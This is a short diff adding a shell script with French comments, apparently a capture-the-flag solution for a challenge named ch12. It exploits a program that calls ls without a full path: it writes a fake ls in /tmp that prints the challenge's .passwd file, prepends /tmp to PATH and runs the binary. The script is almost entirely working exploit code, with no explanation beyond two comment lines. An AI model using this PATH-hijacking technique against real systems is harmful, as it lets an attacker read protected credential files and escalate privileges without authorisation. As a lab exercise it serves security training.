@@ -1,0 +1,7 @@
+#Cette fois, on le programme fait appel a ls avec uneoption.
+#Il suffit de remplacer l'appel a ls par un appel a cat du fichier que l'on veut.
+
+echo "cat /challenge/app-script/ch12/.passwd" > /tmp/ls
+chmod +x /tmp/ls
+export PATH=/tmp:$PATH
+./ch12
